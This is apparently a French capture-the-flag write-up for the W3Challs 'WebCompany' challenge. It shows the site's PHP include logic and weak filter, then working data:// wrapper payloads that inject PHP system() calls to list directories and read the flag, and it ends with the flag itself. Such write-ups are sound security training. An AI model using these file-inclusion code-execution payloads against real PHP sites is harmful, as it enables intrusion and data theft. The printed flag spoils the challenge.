# WebCompany

1. Tout d'abord, nous allons allé sur le [site](http://webcompany.hax.w3challs.com/) et lire le [code source](https://git.w3challs.com/challenges/hax/tree/master/webcompany).
2. Ensuite, nous appuyons sur le bouton contact et services sur le site Web, nous avons pu trouver un paramètre intéressant "p".
3. Maintenant, recherchons le code source de l’index.php.
    ```php=
    <?php

    ob_start();

    (include_once 'config.php') === false
        ? die
        : (include_once $incDir .'/'. $securityFile . $incExt) === false
            ? die
            : (include_once $incDir .'/'. $headerFile . $incExt) === false
                ? die
                : isset($_GET['p'])
                    ? is_string($_GET['p'])
                        ? secure($_GET['p'])
                            ? include $_GET['p'] . $pageExt
                            : include_once 'home' . $pageExt
                        : include_once 'home' . $pageExt
                    : include_once 'home' . $pageExt;
    (include_once $incDir .'/'. $footerFile . $incExt) === false
        ? ob_clean()
        : null ;

    ob_end_flush();

    ?>
    ```
    Nous savons qu’il obtient "p" pour trouver la page et utiliser la fonction sécurisée pour s’assurer que les mots ne peuvent pas influencer le travail. Cependant, nous recherchons le fichier sercurity.inc.php dans le fichier inc.
    ```php=
    <?php

    if( defined('CONFIG') === false ) die;

    function secure($url)
    {
        define('START',   1);
        define('END',     2);
        define('CONTAIN', 4);
        define('MATCH',   8);

        $filters = Array(
            'http://'  => START,
            'https://' => START,
            'ftp://'   => START,
            'ftps://'  => START,
            'file://'  => START,
            '/'        => START,
            '..'       => CONTAIN
        );

        foreach ($filters AS $rule => $type)
        {
            $rule = preg_quote($rule);
            switch ($type)
            {
                case START   : $pattern = '#^'.$rule.'#i';  break;
                case END     : $pattern = '#'.$rule.'$#i';  break;
                case CONTAIN : $pattern = '#'.$rule.'#i';   break;
                case MATCH   : $pattern = '#^'.$rule.'$#i'; break;
            }
            if (preg_match($pattern, $url))
                return false;
        }

        return true;
    }

    ?>
    ```
    Nous savons que nous ne sommes pas en mesure d’utiliser les mots dans le filtre comme charge utile.
4. C'est une attaque appellé [LFI attack](https://en.wikipedia.org/wiki/File_inclusion_vulnerability). J'ai utilisé le payload dans le [site](https://ctf-wiki.github.io/ctf-wiki/web/php/php/). Voici mon payload. 
    ```url=
    http://webcompany.hax.w3challs.com/index.php?p=data://text/plain,%3C?php%20system(%22ls%22);?%3E
    ```
    Voici la réponse.
    ```html=
    config.php
    contact.page.php
    home.page.php
    inc
    index.php
    services.page.php
    style
    yo
    .page.php
    ```
    Ensuite j'ai utilisé `chdir(yo)` pour visiter le fichier et ça `system("ls")`. Finallement j'ai obtenu le flag. Voici mon payload.
    ```url=
    http://webcompany.hax.w3challs.com/index.php?p=data://text/plain,?php%20chdir(yo);chdir(dawg);chdir(i);chdir(herd);chdir(you);chdir(like);chdir(flagz);system(%22cat%20flagz%22);?%3E
    ```
**5. Voici le flag :** `W3C{d4fuck allow_url_include 1s 0n?!}`
